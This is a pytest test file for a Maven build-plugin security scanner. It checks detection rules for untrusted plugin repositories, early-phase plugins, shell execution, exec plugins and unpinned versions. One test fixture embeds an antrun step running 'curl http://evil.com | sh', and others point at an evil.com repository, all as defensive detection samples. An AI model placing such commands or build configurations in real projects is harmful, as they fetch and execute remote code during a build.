"""Tests for MavenPluginScanner — pom.xml build plugin risks."""

from __future__ import annotations

import asyncio

import pytest

from depfence.scanners.maven_plugin_scanner import MavenPluginScanner


@pytest.fixture
def scanner():
    return MavenPluginScanner()


def run(scanner, project_dir):
    return asyncio.run(scanner.scan_project(project_dir))


class TestUntrustedRepo:
    def test_untrusted_plugin_repo(self, tmp_path, scanner):
        pom = tmp_path / "pom.xml"
        pom.write_text("""<project>
  <pluginRepositories>
    <pluginRepository>
      <id>evil</id>
      <url>https://evil.com/maven</url>
    </pluginRepository>
  </pluginRepositories>
</project>""")
        findings = run(scanner, tmp_path)
        mv01 = [f for f in findings if f.metadata.get("rule") == "MV-01"]
        assert len(mv01) == 1

    def test_maven_central_ok(self, tmp_path, scanner):
        pom = tmp_path / "pom.xml"
        pom.write_text("""<project>
  <pluginRepositories>
    <pluginRepository>
      <id>central</id>
      <url>https://repo.maven.apache.org/maven2</url>
    </pluginRepository>
  </pluginRepositories>
</project>""")
        findings = run(scanner, tmp_path)
        mv01 = [f for f in findings if f.metadata.get("rule") == "MV-01"]
        assert len(mv01) == 0


class TestEarlyPhase:
    def test_untrusted_plugin_early_phase(self, tmp_path, scanner):
        pom = tmp_path / "pom.xml"
        pom.write_text("""<project><build><plugins>
  <plugin>
    <groupId>com.evil</groupId>
    <artifactId>backdoor-plugin</artifactId>
    <version>1.0</version>
    <executions><execution>
      <phase>validate</phase>
    </execution></executions>
  </plugin>
</plugins></build></project>""")
        findings = run(scanner, tmp_path)
        mv02 = [f for f in findings if f.metadata.get("rule") == "MV-02"]
        assert len(mv02) == 1

    def test_apache_plugin_early_phase_ok(self, tmp_path, scanner):
        pom = tmp_path / "pom.xml"
        pom.write_text("""<project><build><plugins>
  <plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-enforcer-plugin</artifactId>
    <version>3.0</version>
    <executions><execution>
      <phase>validate</phase>
    </execution></executions>
  </plugin>
</plugins></build></project>""")
        findings = run(scanner, tmp_path)
        mv02 = [f for f in findings if f.metadata.get("rule") == "MV-02"]
        assert len(mv02) == 0


class TestAntrun:
    def test_antrun_shell_exec(self, tmp_path, scanner):
        pom = tmp_path / "pom.xml"
        pom.write_text("""<project><build><plugins>
  <plugin>
    <artifactId>maven-antrun-plugin</artifactId>
    <version>3.0</version>
    <configuration>
      <target>
        <exec executable="/bin/sh">
          <arg value="-c"/>
          <arg value="curl http://evil.com | sh"/>
        </exec>
      </target>
    </configuration>
  </plugin>
</plugins></build></project>""")
        findings = run(scanner, tmp_path)
        mv03 = [f for f in findings if f.metadata.get("rule") == "MV-03"]
        assert len(mv03) == 1


class TestExecPlugin:
    def test_exec_maven_plugin(self, tmp_path, scanner):
        pom = tmp_path / "pom.xml"
        pom.write_text("""<project><build><plugins>
  <plugin>
    <groupId>org.codehaus.mojo</groupId>
    <artifactId>exec-maven-plugin</artifactId>
    <version>3.0</version>
    <configuration>
      <executable>python</executable>
    </configuration>
  </plugin>
</plugins></build></project>""")
        findings = run(scanner, tmp_path)
        mv04 = [f for f in findings if f.metadata.get("rule") == "MV-04"]
        assert len(mv04) == 1


class TestUnpinnedPlugin:
    def test_no_version(self, tmp_path, scanner):
        pom = tmp_path / "pom.xml"
        pom.write_text("""<project><build><plugins>
  <plugin>
    <groupId>com.example</groupId>
    <artifactId>some-plugin</artifactId>
  </plugin>
</plugins></build></project>""")
        findings = run(scanner, tmp_path)
        mv05 = [f for f in findings if f.metadata.get("rule") == "MV-05"]
        assert len(mv05) == 1

    def test_with_version_ok(self, tmp_path, scanner):
        pom = tmp_path / "pom.xml"
        pom.write_text("""<project><build><plugins>
  <plugin>
    <groupId>com.example</groupId>
    <artifactId>some-plugin</artifactId>
    <version>2.0.0</version>
  </plugin>
</plugins></build></project>""")
        findings = run(scanner, tmp_path)
        mv05 = [f for f in findings if f.metadata.get("rule") == "MV-05"]
        assert len(mv05) == 0


class TestCleanPom:
    def test_no_plugins(self, tmp_path, scanner):
        pom = tmp_path / "pom.xml"
        pom.write_text("""<project>
  <groupId>com.safe</groupId>
  <artifactId>safe-app</artifactId>
  <version>1.0</version>
</project>""")
        findings = run(scanner, tmp_path)
        assert len(findings) == 0
